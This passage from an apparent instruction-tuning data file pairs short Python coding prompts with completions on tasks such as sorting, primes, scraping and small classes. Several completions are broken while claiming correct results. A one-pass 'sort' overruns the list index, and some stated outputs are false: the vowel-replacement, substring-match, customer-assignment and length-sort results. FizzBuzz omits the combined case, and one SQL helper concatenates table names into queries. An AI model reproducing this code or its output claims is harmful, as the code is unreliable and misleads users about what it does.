\\"green\\", \\"yellow\\"]))"},{"prompt":"Generate a Python program that fetches information from a given database table and displays it in a web page. Database Table: id | name | age || 1 | Bob | 18 2 | Mary | 20 3 | Carl | 19 4 | Jane | 22","completion":"import sqlite3 from flask import Flask, render_template app = Flask(name) conn = sqlite3.connect('mydatabase.db') cursor = conn.cursor() @app.route('/') def index(): cursor.execute(\\"SELECT * FROM mytable\\") results = cursor.fetchall() return render_template('index.html', results=results) if name == 'main': app.run(debug=True) // templates/index.html <html> <head> <title>Welcome to my page</title> </head> <body> <h1>My Database Results:</h1> <table> <tr> <th>ID</th> <th>Name</th> <th>Age</th> </tr> {% for result in results %} <tr> <td>{{ result[0] }}</td> <td>{{ result[1] }}</td> <td>{{ result[2] }}</td> </tr> {% endfor %} </table> </body> </html>"},{"prompt":"Generate a rotating cube in Python using OpenGL.","completion":"import pygame from pygame.locals import * from OpenGL.GL import * from OpenGL.GLU import * # cube vertices vertices = ( (1, -1, -1), (1, 1, -1), (-1, 1, -1), (-1, -1, -1), (1, -1, 1), (1, 1, 1), (-1, -1, 1), (-1, 1, 1) ) # cube edges edges = ( (0,1), (0,3), (0,4), (2,1), (2,3), (2,7), (6,3), (6,4), (6,7), (5,1), (5,4), (5,7) ) def Cube(): glBegin(GL_LINES) for edge in edges: for vertex in edge: glVertex3fv(vertices[vertex]) glEnd() def main(): pygame.init() display = (800,600) pygame.display.set_mode(display, DOUBLEBUF|OPENGL) # set viewport gluPerspective(45, (display[0]/display[1]), 0.1, 90.0) glTranslatef(0.0, 0.0, -20) # cube rotation glRotatef(45.0, 0.0, 1.0, 0.0) glRotatef(45.0, 1.0, 0.0, 0.0) # render the sphere Cube() pygame.display.flip() pygame.time.wait(1000) if __name__ == '__main__': main()"},{"prompt":"Develop a Python function that sorts a given list of strings on the basis of the length of the string. ['Coders', 'NS', 'Coding', 'Program']","completion":"def sort_list(lst): return sorted(lst, key = len) lst = ['Coders', 'NS', 'Coding', 'Program'] result = sort_list(lst) print(result) # ['NS', 'Coding', 'Coders', 'Program']"},{"prompt":"Generate a list of unique strings with length of 8 bytes in Python.","completion":"import random import string def generate_list_of_strings(length, count): result = [] for _ in range(count): result.append(''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))) return result if __name__ == '__main__': strings_list = generate_list_of_strings(8, 10) print(\\"Randomly generated strings:\\") print(strings_list)"},{"prompt":"Create a Python script that replaces all words containing 3 or more consecutive vowels with *. entertainment","completion":"import re def replaceConsecutiveVowels(word): regex = re.compile(r'[aeiou]{3,}', re.IGNORECASE) return regex.sub(\\"*\\", word) word = \\"entertainment\\" print(replaceConsecutiveVowels(word)) # Output: *"},{"prompt":"Edit the following python code to run in Python 3 print Hello World!","completion":"print(\\"Hello World!\\")"},{"prompt":"Create a python class for an Inventory Manager.","completion":"class InventoryManager: def __init__(self): self.items = [] def add_item(self, item): self.items.append(item) def remove_item(self, item): self.items.remove(item) def print_inventory(self): for item in self.items: print(item)"},{"prompt":"Design a Python program which can preprocess a given dataset of text for further processing by a machine learning model.","completion":"\\"\\"\\" Design a Python program which can pre-process a given dataset of text for further processing by a machine learning model. \\"\\"\\" import re import nltk def preprocess_text(text): # lower case text = text.lower() # remove punctuation text = re.sub(r'[^ws]', '', text) # tokenize tokens = nltk.tokenize.word_tokenize(text) # remove stopwords words = [word for word in tokens if not word in nltk.corpus.stopwords.words('english')] # lemmatize lemmatizer = nltk.stem.WordNetLemmatizer() words = [lemmatizer.lemmatize(word) for word in words] return words if __name__ == '__main__': text = 'hello world! My name is John.' preprocessed = preprocess_text(text) print(preprocessed)"},{"prompt":"Chart the following equation y=3x+2 using Python. Not applicable","completion":"import matplotlib.pyplot as plt x_values = range(-20, 21) y_values = [3*x+2 for x in x_values] plt.plot(x_values, y_values) plt.xlabel('x') plt.ylabel('y') plt.title('y = 3x + 2') plt.show()"},{"prompt":"Remove all the commented code from Python program. # This code will print Hello World! print(Hello World!) # This code can be used to increment i i=i+1","completion":"print(\\"Hello World!\\") i=i+1"},{"prompt":"Create a Python program that can convert a list of strings into their corresponding encoded values. list of strings = [hello,world,how,are,you]","completion":"def encode_list_of_strings(list_of_strings): encoded = [] for string in list_of_strings: encoded.append(string.encode(\\"utf-8\\")) return encoded list_of_strings = [\\"hello\\",\\"world\\",\\"how\\",\\"are\\",\\"you\\"] encoded = encode_list_of_strings(list_of_strings) # Output: [b'hello', b'world', b'how', b'are', b'you']"},{"prompt":"Create a Python module to analyze SQL database tables and return meta information like number of rows, column names and data types.","completion":"import sqlite3 def get_table_meta_info(db_name, table_name): conn = sqlite3.connect(db_name) cur = conn.cursor() cur.execute(\\"SELECT * FROM \\"+ table_name) col_names = [tuple[0] for tuple in cur.description] row_length = len(col_names) cur.execute(\\"PRAGMA table_info(\\"+ table_name +\\")\\") table_info = cur.fetchall() data_types = [] for row in table_info: data_types.append(row[2]) meta_info = { 'table_name': table_name, 'row_length': row_length, 'column_names': col_names, 'data_types': data_types } return meta_info"},{"prompt":"Create a Python function which takes a string as input and returns a list of words and their frequencies. This is a test string to test the function","completion":"def word_freq(s): # Create an empty dictionary word_count = {} # Split the string into a list of words words = s.split() # Loop through each word for word in words: # If the word is already in the dictionary, increment its count if word in word_count: word_count[word] += 1 # Else, add the word to the dictionary with a count of 1 else: word_count[word] = 1 # Return the dictionary return word_count word_freq('This is a test string to test the function') # Output # {'This': 1, 'is': 1, 'a': 1, 'test': 2, 'string': 1, 'to': 1, 'function': 1}"},{"prompt":"Rewrite the following python program using a functional programming approach. The code should take a list of integers as input, filter out the odd numbers, square each even number, and return the sum of all the numbers. [3, 4, 5, 6, 7, 8, 9, 10]","completion":"def fx(nums): return sum(map(lambda x : x*x if x % 2==0 else 0, nums)) print(fx([3, 4, 5, 6, 7, 8, 9, 10])) # Output: 240"},{"prompt":"Design an algorithm in Python that reads an unordered array of integers and prints the integers in sorted order. [98, 45, 21, 99, 74, 44]","completion":"def sortArray(arr): for i in range(len(arr)): if (arr[i] > arr[i+1]): temp = arr[i] arr[i] = arr[i+1] arr[i+1] = temp return arr print(sortArray([98, 45, 21, 99, 74, 44])) # Output: [21, 44, 45, 74, 98, 99]"},{"prompt":"Write a Python program to create a list containing all the prime numbers from 0 to 100.","completion":"primes = [2] for number in range(3,101): is_prime = True for element in primes: if number % element == 0: is_prime = False if is_prime: primes.append(number) print(primes)"},{"prompt":"Write a python code to find the roots of the equation: x2 7x + 10 = 0.","completion":"#Calculates roots of quadratic equation a = 1 b = -7 c = 10 #Calculate root using formula discriminant = (b**2) - (4*a*c) if discriminant < 0: print(\\"The equation has no real solutions.\\") else: root1 = (-b + (discriminant**.5)) / (2*a) root2 = (-b - (discriminant**.5)) / (2*a) print(\\"The roots of this equation are:\\", root1, \\"and\\", root2)"},{"prompt":"Write Python code to retrieve a specific element from a 2D array. my_2d_array = [[1,2,3],[4,5,6],[7,8,9]] row_to_retrieve = 2 column_to_retrieve = 0","completion":"my_2d_array = [[1,2,3],[4,5,6],[7,8,9]] row_to_retrieve = 2 column_to_retrieve = 0 retrieved_element = my_2d_array[row_to_retrieve][column_to_retrieve]"},{"prompt":"Write a python program to generate a Combinations of four numbers from a given list of N numbers numbers = [1, 4, 5, 6, 7]","completion":"def comb_four(nums): result = [] for i in range(len(nums)-3): for j in range(i+1, len(nums)-2): for k in range(j+1, len(nums)-1): for l in range(k+1, len(nums)): result.append([nums[i], nums[j], nums[k], nums[l]]) return result"},{"prompt":"mplement a decision tree classifier in Python using the scikitlearn library to predict whether a person will purchase an item (1) or not (0). A dataset of features including age, gender, and job type of a person.","completion":"from sklearn.tree import DecisionTreeClassifier import pandas as pd # Read in the data data = pd.read_csv('data.csv') # Split the data into target (purchase or not) and features X = data.iloc[:, 0:-1] y = data.iloc[:,-1] # Create the decision tree classifier clf = DecisionTreeClassifier(criterion='entropy') # Train the classifier clf.fit(X, y) # Make predictions on test data y_pred = clf.predict(X) # Calculate the accuracy of the predictions from sklearn import metrics print('Accuracy: ', metrics.accuracy_score(y, y_pred))"},{"prompt":"Create a Python class for a polygon shape.","completion":"class Polygon: def __init__(self, sides): self.sides = sides def perimeter(self): perimeter = 0 for side in self.sides: perimeter += side return perimeter"},{"prompt":"Write a Python program to identify the longest common subsequence of two given strings.","completion":"def longest_common_subsequence(s1, s2): m = len(s1) n = len(s2) # Create a table to store results of subproblems dp = [[0 for x in range(n + 1)] for x in range(m + 1)] # Fill d[][] in bottom up manner for i in range(m + 1): for j in range(n + 1): if i == 0 or j == 0: dp[i][j] = 0 elif s1[i - 1] == s2[j - 1]: dp[i][j] = dp[i - 1][j - 1] + 1 else: dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]) # LCS will be last entry in the lookup table return dp[m][n]"},{"prompt":"Design a recursive function to generate Fibonacci numbers using Python.","completion":"def Fibonacci_Generator(n): if n<0: print(\\"Incorrect input\\") # First and Second Fibonacci numbers are 0 and 1 respectively elif n==1: return 0 elif n==2: return 1 else: return Fibonacci_Generator(n-1)+Fibonacci_Generator(n-2)"},{"prompt":"Write a Python function to convert an Celsius temperature to Fahrenheit.","completion":"def celsius_to_fahrenheit(celsius): fahrenheit = celsius * 9/5 + 32 return fahrenheit"},{"prompt":"Write a python program that takes a list of numbers and converts them to strings. [1, 2, 3, 4]","completion":"new_list = [] for i in range(0, len(list)): new_list.append(str(list[i]))"},{"prompt":"Create a NLP model in Python to classify movie reviews from IMDb as either positive or negative. Not applicable","completion":"import pandas as pd import numpy as np from sklearn.model_selection import train_test_split from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB # Load and clean the data data = pd.read_csv('imdb_data.csv').dropna() # Split the data into training and test sets X_train, X_test, y_train, y_test = train_test_split(data['review'], data['label'], test_size=0.2) # Create bag of words model cv = CountVectorizer() cv.fit(X_train) X_train = cv.transform(X_train) X_test = cv.transform(X_test) # Create Naive Bayes model NB_model = MultinomialNB() NB_model.fit(X_train, y_train) # Make predictions y_predictions = NB_model.predict(X_test) # Evaluate performance accuracy = np.mean(y_predictions==y_test) print('Model accuracy is:', accuracy)"},{"prompt":"Construct a for loop in Python to print all even numbers from 3 to 10.","completion":"for i in range(3, 11): if(i % 2 == 0): print(i)"},{"prompt":"Design a function in Python to determine if a given number is prime. 37","completion":"def is_prime(n): if n <= 1: return False if n == 2: return True if n > 2 and n % 2 == 0: return False sqrt_n = int(n**0.5) for i in range(3, sqrt_n+1, 2): if n % i == 0: return False return True if is_prime(37): print('37 is a prime number!')"},{"prompt":"Write a Python code to find the number of odd and even numbers in a given array. arr = [8, 5, 6, 3, 9]","completion":"arr = [8, 5, 6, 3, 9] odd = 0 even = 0 for num in arr: if num % 2 == 0: even += 1 else: odd += 1 print(\\"Number of odd numbers in the array: \\", odd) print(\\"Number of even numbers in the array: \\", even)"},{"prompt":"Create a program in Python for counting the occurrence of a character in a string. String = Hello! What is your name? Character = 'o'","completion":"String = \\"Hello! What is your name?\\" def characterCounter(string, character): count = 0 for ch in string: if ch == character: count += 1 return count print(characterCounter(String, 'o')) # 2"},{"prompt":"Create a class definition for a Dog in Python.","completion":"class Dog: def __init__(self, name, breed): self.name = name self.breed = breed def bark(self): print(\\"Woof!\\") def __str__(self): return f\\"Name: {self.name}, Breed: {self.breed}\\""},{"prompt":"Create a Python program to search a given list of strings to find any matches to a given substring. list_of_strings = ['Tesla', 'Apple', 'Microsoft', 'Google', 'Amazon'] substring = 'go'","completion":"matches = [] for string in list_of_strings: if substring.lower() in string.lower(): matches.append(string) print(\\"Matches: \\", matches) # Output: Matches: ['Google', 'Amazon']"},{"prompt":"Design and implement a basic neural network for text classification in Python. Not applicable","completion":"import torch import torch.nn as nn class NeuralNet(nn.Module): def __init__(self, vocab_size, embedding_dim, output_dim): super().__init__() self.embedding = nn.Embedding(vocab_size, embedding_dim) self.fc = nn.Linear(embedding_dim, output_dim) def forward(self, x): x = self.embedding(x) x = x.view(x.shape[0], -1) x = self.fc(x) return x model = NeuralNet(vocab_size, embedding_dim, output_dim)"},{"prompt":"Create a function in Python that takes two strings as inputs and prints out the longer of the two strings. Hello World","completion":"def longestString(str1, str2): if len(str1) > len(str2): return str1 else: return str2 print(longestString(\\"Hello\\", \\"World\\"))"},{"prompt":"Compose a Python program to solve an equation using the Bisection method. Equation: f(x) = x^2 3","completion":"def f(x): return x**2 - 3 def bisection(f,a,b,tol): c = (a+b)/2 if f(c)==0 or (b-a)/2 < tol: return c elif f(c)*f(a) > 0: return bisection(f,c,b,tol) else: return bisection(f,a,c,tol)"},{"prompt":"Write a Python function that takes a string as input and returns a boolean value that is True if the input is a palindrome and False if not. Not applicable","completion":"def isPalindrome (string): left_pos = 0 right_pos = len(string) - 1 while right_pos >= left_pos: if not string[left_pos] == string[right_pos]: return False left_pos += 1 right_pos -= 1 return True"},{"prompt":"Generate a python class that implements a singly linked list with methods to add and remove elements.","completion":"class Node(object): # Constructor def __init__(self, data): self.data = data self.next = None class LinkedList(object): # Function to initialize root def __init__(self): self.head = None # Insert a new node at the beginning def push(self, new_data): # 1 & 2: Allocate the Node & Put in the data new_node = Node(new_data) # 3. Make next of new Node as head new_node.next = self.head # 4. Move the head to point to new Node self.head = new_node # Remove a node from the beginning def pop(self): # Store head node temp = self.head # If head node itself holds the key to be deleted if (temp is not None): self.head = temp.next temp = None else: print(\\"The linked list is empty\\") return"},{"prompt":"Suggest a Python version of the following JavaScript code. function double(x) { return x * 2; }","completion":"def double(x): return x * 2"},{"prompt":"Modify the given code in Python so that it prints the given sentence Hello, World! print(Greetings)","completion":"print(\\"Hello, World!\\")"},{"prompt":"Write a Python program to fill an array with random numbers and generate a random index.","completion":"import random # Create an empty array array = [] # Fill the array with random numbers for i in range(10): array.append(random.randrange(10)) # Generate a random index index = random.randrange(10) # Print the numbers and the index print(array) print(\\"Random Index:\\", index)"},{"prompt":"Create a recursive function in Python to calculate the Fibonacci numbers up to the nth term.","completion":"def computeFibonacci(n): if n<0: print(\\"Incorrect input\\") elif n==1: return 0 elif n==2: return 1 else: return computeFibonacci(n-1)+computeFibonacci(n-2)"},{"prompt":"Create a basic chatbot program in Python that responds to user input. Not applicable","completion":"#Import Libraries import re import random #Define the patterns patterns = { 'hello': [\\"hi\\", \\"hey\\", \\"hello\\"], 'bye': ['bye', 'Later', 'Goodbye!'] } #Define Matching Response responses = { 'hello': ['Hi there!', 'Hello there!', 'Greetings!'], 'bye': ['See you later!', 'Goodbye!', 'Bye!'] } #Define a function for responding def respond(message): if message in patterns['hello']: return random.choice(responses['hello']) elif message in patterns['bye']: return random.choice(responses['bye']) else: return \\"I'm sorry, I don't understand.\\" #Define a function for chatting def chat(): print(\\"Welcome to the chatbot! Type 'quit' to exit.\\") while True: message = input('You: ').lower() if message == 'quit': break response = respond(message) print('Bot: ' + response) #Run the chat function chat() # Output: Welcome to the chatbot! Type 'quit' to exit. You: Hi Bot: Hi there! You: Goodbye Bot: See you later! #"},{"prompt":"Create a Python program to display the prime numbers between 1 and 10.","completion":"\\"\\"\\" Create a Python program to display the prime numbers between 1 and 10 \\"\\"\\" #Function to check if a number is prime def is_prime(n): for i in range(2, n): #Check the number between 2 and n if n % i == 0: #If the number is divisible by any other number in that range return False return True #Function to return the list of prime numbers def find_prime_numbers(num): #List to store the prime numbers prime_list = [] for i in range(2, num+1): #Loop through the numbers between 2 and(including) 10 if is_prime(i): #Check if the number is a prime number prime_list.append(i) #Append the prime number to the list return prime_list if __name__ == '__main__': print(find_prime_numbers(10))"},{"prompt":"Create a Python program to detect if a number is a prime number. No input.","completion":"def is_prime(x): if x < 2: return False for i in range(2, x): if x % i == 0: return False return True"},{"prompt":"Modify the code below to slice a 2 dimensional array in python. data = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]","completion":"def get_slice(data, start, end): return [row[start:end] for row in data]"},{"prompt":"Write a Python program that takes a given number and prints out the numbers from 1 to the given number. If a number is divisible by 3, add the word “fizz”. If a number is divisible by 5, add the word “buzz”.","completion":"def fizz_buzz(n): for i in range(1, n+1): if i % 3 == 0: print(\\"fizz\\", end=\\" \\") elif i % 5 == 0: print(\\"buzz\\", end=\\" \\") else: print(i, end=\\" \\") print(\\"\\")"},{"prompt":"Generate a Python function to sort a given integer array in ascending order. [7, 3, 5, 0, 2, 1]","completion":"def sort_ascending(arr): # Iterate through list for i in range(len(arr)): # Iterate through remaining values for j in range(i + 1, len(arr)): # Swap two values if first is greater if arr[i] > arr[j]: arr[i], arr[j] = arr[j], arr[i] return arr # example arr = [7, 3, 5, 0, 2, 1] arr = sort_ascending(arr) print(arr) # Output is [0, 1, 2, 3, 5, 7]"},{"prompt":"Design a dynamic Python list to hold a series of IP addresses.","completion":"ip_list = []"},{"prompt":"Generate a for loop in Python to print numbers from 1 to 10","completion":"for i in range(1,11): print(i)"},{"prompt":"mplement a parse tree using a Python dictionary.","completion":"import collections # Create a tree using a Python dictionary ParseTree = collections.defaultdict(dict) # Function to add a node to the tree def add_node(parent, child): ParseTree[parent][child] = {} # Function to traverse the tree def traverse_tree(node): # Base case if len(ParseTree[node]) == 0: return for key, value in ParseTree[node].items(): print(\\"{}-->{}\\".format(node, key)) traverse_tree(key)"},{"prompt":"You need to write a Python program which converts a given Fahrenheit temperature to its corresponding Celsius temperature. temperature_fahrenheit = 68","completion":"def fahrenheit_to_celsius(temperature_fahrenheit): temperature_celsius = (temperature_fahrenheit - 32) * 5.0 / 9.0 return temperature_celsius result = fahrenheit_to_celsius(temperature_fahrenheit) print(f\\"{temperature_fahrenheit}°F = {result}°C\\") # Output: 68°F ="},{"prompt":"Create a Python program to find factorial for a given number.","completion":"def factorial(n): if n == 0: return 1 else: return n * factorial(n-1) num = 5 print(\\"The factorial of\\", num, \\"is\\", factorial(num))"},{"prompt":"Develop a Python program to reverse a list of numbers. [1, 2, 3, 4, 5]","completion":"def reverse_list(nums): \\"\\"\\"Function to reverse a list of numbers. Parameters ---------- nums : list List of numbers to be reversed. Returns ------- reversed_list : list Reversed list of numbers. \\"\\"\\" reversed_list = nums[::-1] return reversed_list"},{"prompt":"Construct a code to find the sum of a series of numbers entered by the user using Python.","completion":"total = 0 count = 0 while True: user_input = int(input(\\"Enter an integer (enter 0 to stop): \\")) if user_input == 0: break else: total += user_input count += 1 print(\\"The sum of\\", count, \\"numbers is\\", total)"},{"prompt":"Create a Python class for media items (movies, TV shows, etc). The class should have class variables for genre, duration, and release date, as well as methods for setting and getting the attributes. Not applicable","completion":"class MediaItem: def __init__(self, genre, duration, release_date): self.genre = genre self.duration = duration self.release_date = release_date @property def genre(self): return self.__genre @genre.setter def genre(self, genre): self.__genre = genre @property def duration(self): return self.__duration @duration.setter def duration(self, duration): self.__duration = duration @property def release_date(self): return self.__release_date @release_date.setter def release_date(self, release_date): self.__release_date = release_date"},{"prompt":"Write a Python script to compress a directory using the gzip library. source directory: example_dir","completion":"import gzip import os # Walk through the source directory for root, dirs, files in os.walk('example_dir'): # Gzip each file for file in files: with open(os.path.join(root, file), 'rb') as f_in: with gzip.open(os.path.join(root, file + '.gz'), 'wb') as f_out: f_out.writelines(f_in)"},{"prompt":"Write a Python program to solve the below puzzle. Given a list of integers and a number ‘X’, find two numbers in the list whose sum is equal to ‘X’","completion":"def find_sum_pair(arr, X): for i in range(0, len(arr)): for j in range(i+1, len(arr)): if arr[i] + arr[j] == X: return [arr[i], arr[j]] return []"},{"prompt":"Write a Python program to take user input and check if it is a palindrome or not. racecar","completion":"def isPalindrome(inp): inp = inp.lower() return inp == inp[::-1] user_input = input('Enter string: ') if isPalindrome(user_input): print('It's a palindrome') else: print('It's not a palindrome')"},{"prompt":"Create a Python function that takes in an array of numbers and returns the maximum value in the array. [5, 8, 1, 7, 4]","completion":"def max_value(arr): return max(arr)"},{"prompt":"Prepare a Python program to categorize sentences according to their sentiment. The program should first use the TextBlob library to detect the sentiment of each sentence and then classify them to Positive, Negative, and Neutral sentiment. The service was excelle","completion":"from textblob import TextBlob text = \\"The service was excellent\\" sentiment = TextBlob(text).sentiment print(\\"Sentiment: {}\\".format(sentiment)) if sentiment.polarity > 0: print(\\"Positive\\") elif sentiment.polarity == 0: print(\\"Neutral\\") else: print(\\"Negative\\")"},{"prompt":"Create a class in Python to implement a simplified version of the A* search algorithm. Details on the algorithm can be found at https://en.wikipedia.org/wiki/A*_search_algorithm Not applicable","completion":"class Node: def __init__(self, state, parent_node = None, cost_to_start = 0): self.state = state self.parent_node = parent_node self.cost_to_start = cost_to_start self.total_cost = 0 def set_total_cost(self, total_cost): self.total_cost = total_cost def get_path_from_root(self): path = [self] node = self while node.parent_node: node = node.parent_node path.append(node) return path[::-1] def get_states_from_root(self): return list(map(lambda node: node.state, self.get_path_from_root())) def __str__(self): return str(self.state) def __repr__(self): return str(self.state) class AStar: def __init__(self, start_state, expand_edge, heuristic_cost, goal_test): self.start_node = Node(start_state) self.expand_edge = expand_edge self.heuristic_cost = heuristic_cost self.goal_test = goal_test def search(self): open_list = [self.start_node] closed_list = [] while open_list: node = self.select_node_for_expansion(open_list) if self.goal_test(node.state): return node.get_path_from_root() open_list.remove(node) closed_list.append(node) child_nodes = self.expand_edge(node) for child_node in child_nodes: self.update_costs(child_node, node, open_list, closed_list) open_list.sort(key=lambda x: x.total_cost) raise Exception('Goal not reachable') def select_node_for_expansion(self, open_list): node = open_list[0] for n in open_list: if n.total_cost < node.total_cost: node = n return node def update_costs(self, child_node, parent_node, open_list, closed_list): cost_from_start_to_child = parent_node.cost_to_start + self.expand_edge(parent_node, child_node) total_cost = cost_from_start_to_child + self.heuristic_cost(child_node) in_open_list = any(map(lambda x: x.state == child_node.state, open_list)) in_closed_list = any(map(lambda x: x.state == child_node.state, closed_list)) if not in_open_list and not in_closed_list: child_node.cost_to_start = cost_from_start_to_child child_node.set_total_cost(total_cost) child_node.parent_node = parent_node open_list.append(child_node) elif in_open_list and total_cost < open_list[0].total_cost: node = list(filter(lambda x: x.state == child_node.state, open_list))[0] node.cost_to_start = cost_from_start_to_child node.set_total_cost(total_cost) node.parent_node = parent_node elif in_closed_list and total_cost < closed_list[0].total_cost: node = list(filter(lambda x: x.state == child_node.state, open_list))[0] node.cost_to_start = cost_from_start_to_child node.set_total_cost(total_cost) node.parent_node = parent_node open_list.append(node) closed_list.remove(node)"},{"prompt":"Create a Python function clamp that takes a number, a lower bound and an upper bound and clamps the value between the two bounds. number=12, lower=3, upper=15","completion":"def clamp(number, lower, upper): if number < lower: return lower elif number > upper: return upper else: return number"},{"prompt":"Build a simple Twitter bot in Python that retweets other user’s tweets. Not applicable","completion":"# import required modules import tweepy import time # Set access credentials consumer_key = 'YourConsumerKey' consumer_secret = 'YourConsumerSecret' access_token = 'YourAccessToken' access_token_secret = 'YourAccessTokenSecret' # Set authentication and API object auth = tweepy.OAuthHandler(consumer_key, consumer_secret) auth.set_access_token(access_token, access_token_secret) api = tweepy.API(auth) # Search for tweets with hashtag #python. # 150 tweets will be retreived search_query = '#python' search_result = api.search(q=search_query, count=150) # Retweet each of the tweets for tweet in search_result: api.retweet(tweet.id) time.sleep(1)"},{"prompt":"Write a Python function that takes a list of numbers and returns the sum of all odd numbers in the list. [1, 2, 3, 4, 5]","completion":"def sum_odd_numbers(nums): result = 0 for num in nums: # check for odd number if num % 2 != 0: result += num return result result = sum_odd_numbers([1, 2, 3, 4, 5]) print(result)"},{"prompt":"Write a Python program to split a list into different variables my_list = [Hello, World, 42]","completion":"value1, value2, value3 = my_list print(value1) print(value2) print(value3)"},{"prompt":"Write a Python script to find the unique elements of a given list. List: [1, 1, 2, 3, 4, 5, 5]","completion":"list_x = [1, 1, 2, 3, 4, 5, 5] unique_elements = set(list_x) print(unique_elements) #output: {1, 2, 3, 4, 5}"},{"prompt":"Create an algorithm in Python that optimizes the number of customers assigned to a store. The algorithm should take in an array of customers and the maximum capacity of the store as the inputs, and should return an array of the customers that should be assigned to the store. Maximum Capacity: 8 Customers: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]","completion":"def assign_customers(customers, max_capacity): # Initialize an output array assigned = [] # Keep track of the current capacity current_capacity = 0 # Iterate over the customers for customer in customers: # Check if the current capacity + the customer size is less than or equal to the max capacity if current_capacity + customer <= max_capacity: # If it is, add the customer to the output array and increment the current capacity assigned.append(customer) current_capacity += customer else: # If it is not, break from the loop break return assigned print(assign_customers([1, 2, 3, 4, 5, 6, 7, 8, 9, 10], 8)) # Outputs: [1, 2, 3, 4, 5, 6, 7, 8]"},{"prompt":"Create a code in Python to print a Pascal triangle.","completion":"def pascal_triangle(n): # Two empty lists to store the previous and current row prev_row = [] curr_row = [] # Looping through the rows for i in range(n): # Reseting the curr_row for each row curr_row = [] # Looping through columns for j in range(i + 1): # Handling edges of the pascal's triangle if j == 0 or j == i: curr_row.append(1) else: curr_row.append(prev_row[j] + prev_row[j - 1]) # Printing the current row print(curr_row) # Setting the current row as the previous row before moving to the next row. prev_row = curr_row # call the pascal triangle function n = 5 pascal_triangle(n)"},{"prompt":"Create a web scraper in Python to extract the title, description, and links of the blog posts on a given page. List of blog post URLs: https://blog.example.com/post1 https://blog.example.com/post2 https://blog.example.com/post3","completion":"import requests import bs4 urls = [ 'https://blog.example.com/post1', 'https://blog.example.com/post2', 'https://blog.example.com/post3' ] for url in urls: page = requests.get(url) soup = bs4.BeautifulSoup(page.content, 'html.parser') title = soup.find('title').get_text() description = soup.find('meta', {'name':'description'})['content'] links = [a['href'] for a in soup.find_all('a', href=True)] print('Title:', title) print('Description:', description) print('Links:', links) print()"},{"prompt":"mplement a Python program to check if a given number is an Armstrong Number","completion":"def checkArmstrong(num): temp = num res = 0 while temp > 0: digit = temp % 10 res = res + digit ** 3 temp = temp // 10 if num == res: return f'{num} is an Armstrong Number' else: return f'{num} is not an Armstrong Number'"},{"prompt":"Create a python script to parse a given XML document.","completion":"import xml.etree.ElementTree as ET def parse_xml_document(filename): tree = ET.parse(filename) root = tree.getroot() # loop through the items in XML for child in root: print(child.attrib)"},{"prompt":"Write a Python program using a for loop to sum up the even numbers in a given list. number_list = [2, 3, 5, 7, 11, 13, 17]","completion":"total = 0 for number in number_list: if number % 2 == 0: total += number print(total) # prints 2 + 6 = 8"},{"prompt":"Design a Python program to make a calculator that can add, subtract, multiply, and divide two numbers.","completion":"# define functions def add(x, y): return x + y def subtract(x, y): return x - y def multiply(x, y): return x * y def divide(x, y): return x / y # take input from the user print(\\"Select operation.\\") print(\\"1.Add\\") print(\\"2.Subtract\\") print(\\"3.Multiply\\") print(\\"4.Divide\\") choice = input(\\"Enter choice(1/2/3/4):\\") num1 = int(input(\\"Enter first number: \\")) num2 = int(input(\\"Enter second number: \\")) if choice == '1': print(num1,\\"+\\",num2,\\"=\\", add(num1,num2)) elif choice == '2': print(num1,\\"-\\",num2,\\"=\\", subtract(num1,num2)) elif choice == '3': print(num1,\\"*\\",num2,\\"=\\", multiply(num1,num2)) elif choice == '4': print(num1,\\"/\\",num2,\\"=\\", divide(num1,num2)) else: print(\\"Invalid input\\")"},{"prompt":"Automate the following task with a combination of Python and SQL: Create a new table in a database called 'People' with the following attributes: first name, last name, and email address.","completion":"import sqlite3 database = sqlite3.connect('people-data.db') # Create the table cursor = database.cursor() sql_command = \\"\\"\\" CREATE TABLE People ( first_name VARCHAR(20), last_name VARCHAR(30), email VARCHAR(50));\\"\\"\\" cursor.execute(sql_command) # Save and close database.commit() database.close()"},{"prompt":"Define a function in Python that takes two strings and returns a new string which is the concatenation of the two. Hello and World","completion":"def concatenate_two_strings(str_1, str_2): return str_1 + str_2 conc_str = concatenate_two_strings(\\"Hello\\", \\" World\\") print(conc_str)"},{"prompt":"Generate a Django script to create a new Django project with an app called 'users'. <no input>","completion":"# Create the project django-admin startproject mysite # Move to the project directory cd mysite # Create the users app python manage.py startapp users # Update the settings vi mysite/settings.py # Add 'users' to the 'INSTALLED_APPS' list INSTALLED_APPS = [ ... 'users', ] # Create the database python manage.py migrate # Create the models vi users/models.py # Add the User model class User(models.Model): username = models.CharField(max_length=50) email = models.EmailField() name = models.CharField(max_length=50) # Create the admin user python manage.py createsuperuser # Run the server python manage.py runserver"},{"prompt":"Write a Python program that takes a list as input and returns the longest consecutive string of characters. ['a', 'bb', 'ccc', 'dd', 'eee']","completion":"def longest_consecutive(lst): longest = \\"\\" for word in lst: if len(word) > len(longest): longest = word return longest lst = ['a', 'bb', 'ccc', 'dd', 'eee'] print(longest_consecutive(lst)) # Output should be \\"ccc\\""},{"prompt":"Create a python program to scrape data from Twitter","completion":"import tweepy consumer_key = '' consumer_secret = '' access_token = '' access_token_secret = '' # authorization auth = tweepy.OAuthHandler(consumer_key, consumer_secret) auth.set_access_token(access_token, access_token_secret) api = tweepy.API(auth) # get data from a particular twitter user tweets = api.user_timeline(screen_name='twitter_handle', count=200, include_rts=False, exclude_replies=True) for tweet in tweets: # scraping a data from tweets print(tweet.text)"},{"prompt":"Write a Python script to autogenerate 3D models from CAD designs Not applicable","completion":"import numpy as np import cv2 from stl import mesh from scipy.spatial import Delaunay def generate_3d_model(cad_file): # open file containing 2D designs img = cv2.imread(cad_file) # convert to grayscale gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # perform a binary threshold ret, thresh = cv2.threshold(gray, 127, 255, 0) # find contours in the binary image contours, hierarchy = cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE) # get coordinates of all points in the contour coordinates = [] for contour in contours: for points in contour: coordinates.append([points[0][0], points[0][1]]) # apply 2D Delaunay triangulation to the coordinates delaunay = Delaunay(coordinates) # apply 3D Delaunay triangulation to the coordinates triangles = np.array([[coordinates[t[0]], coordinates[t[1]], coordinates[t[2]]] for t in delaunay.simplices]) # generate 3D mesh mesh3d = mesh.Mesh(np.zeros(triangles.shape[0], metadata={'faces': 